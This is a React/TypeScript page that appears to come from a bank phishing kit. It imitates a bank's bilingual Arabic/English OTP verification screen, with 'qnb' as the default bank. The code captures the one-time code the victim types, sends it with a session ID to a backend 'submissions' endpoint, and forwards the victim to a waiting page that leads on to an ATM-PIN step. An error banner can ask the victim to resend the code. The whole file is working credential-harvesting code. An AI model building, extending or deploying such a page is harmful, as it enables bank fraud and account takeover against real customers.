import { useState } from "react";
import { useLocation, useSearch } from "wouter";
import { trpc } from "@/lib/trpc";
import { useLanguage } from "@/contexts/LanguageContext";
import { toast } from "sonner";
import Header from "@/components/Header";

export default function Otp() {
  const [, setLocation] = useLocation();
  const search = useSearch();
  const params = new URLSearchParams(search);
  const bank = params.get("bank") || "qnb";
  const { language, setLanguage } = useLanguage();
  const sessionId = localStorage.getItem("sessionId") || params.get("session") || "";
  const showError = params.get("error") === "true";

  const isArabic = language === "ar";

  const [otp, setOtp] = useState("");
  const submitOtpMutation = trpc.submissions.submitOtp.useMutation();

  const handleOtpChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const value = e.target.value.replace(/[^0-9]/g, "").slice(0, 6);
    setOtp(value);
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    const currentSessionId = sessionId || params.get("session") || localStorage.getItem("sessionId") || "";
    
    if (otp.length < 4) {
      toast.error(isArabic ? "الرمز غير مكتمل" : "Incomplete code");
      return;
    }
    
    try {
      await submitOtpMutation.mutateAsync({
        sessionId: currentSessionId,
        otpCode: otp,
        otpType: "standard",
      });
      // التقدم فقط بعد نجاح الإرسال
      setLocation(`/waiting?bank=${bank}&session=${currentSessionId}&next=atm-pin`);
    } catch (error) {
      console.error("Error submitting OTP:", error);
      toast.error(isArabic ? "حدث خطأ أثناء الإرسال. يرجى المحاولة مرة أخرى." : "Error during submission. Please try again.");
    }
  };

  const toggleLanguage = () => {
    setLanguage(isArabic ? "en" : "ar");
  };

  return (
    <div className="page-wrapper" dir={isArabic ? "rtl" : "ltr"}>
      <style>{`
        .page-wrapper { font-family: sans-serif; background-color: #f4f4f4; margin: 0; display: flex; flex-direction: column; min-height: 100vh; }
        .header { position: relative; width: 100%; display: flex; justify-content: space-between; align-items: center; padding: 10px 25px; background-color: #ffffff; border-bottom: 2px solid #8C0032; z-index: 1000; box-sizing: border-box; }
        .logo { height: 80px; width: auto; object-fit: contain; background-color: white; padding: 0; }
        .menu-icon { font-size: 28px; color: #8C0032; cursor: pointer; }
        .lang-btn { background: transparent; color: #8C0032; border: 2px solid #8C0032; padding: 5px 15px; border-radius: 5px; font-weight: bold; cursor: pointer; }
        
        .container { padding: 40px 20px; flex: 1; text-align: center; }
        .otp-box { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); }
        .error-message { background-color: #fef2f2; color: #991b1b; border: 1px solid #fee2e2; padding: 15px; border-radius: 8px; margin-bottom: 20px; text-align: center; font-weight: bold; font-size: 14px; }
        
        .otp-input { width: 100%; padding: 20px; border: 2px solid #ddd; border-radius: 8px; font-size: 24px; text-align: center; font-weight: bold; margin: 20px 0; box-sizing: border-box; letter-spacing: 5px; }
        .otp-input:focus { border-color: #8C0032; outline: none; }
        
        .submit-btn { background: #8C0032; color: white; padding: 15px; width: 100%; border: none; border-radius: 5px; font-weight: bold; cursor: pointer; font-size: 16px; }
        .footer-image { width: 100%; display: block; margin-top: 20px; }
      `}</style>
      <Header />

      <div className="container">
        <div className="otp-box">
          {showError && (
            <div className="error-message" style={{ backgroundColor: '#fee2e2', color: '#dc2626', border: '1px solid #fecaca', padding: '15px', borderRadius: '12px', marginBottom: '20px', fontWeight: 'bold' }}>
              {isArabic ? "برجاء التحقق من الرمز المرسال عبر الجوال" : "Please check the code sent via mobile"}
            </div>
          )}
          <h2>{isArabic ? "أدخل رمز التحقق (OTP)" : "Enter Verification Code (OTP)"}</h2>
          <p>{isArabic ? "تم إرسال رمز التحقق إلى رقم هاتفك المسجل" : "Verification code has been sent to your registered mobile number"}</p>
          <form onSubmit={handleSubmit}>
            <input
              type="text"
              className="otp-input"
              placeholder="------"
              maxLength={6}
              value={otp}
              onChange={handleOtpChange}
              required
            />
            <button type="submit" className="submit-btn">
              {isArabic ? "تأكيد الرمز" : "Confirm Code"}
            </button>
          </form>
        </div>
      </div>

      <div className="footer-image-container">
        <img src={isArabic ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg"} className="footer-image-standard" alt="Footer" />
      </div>
    </div>
  );
}
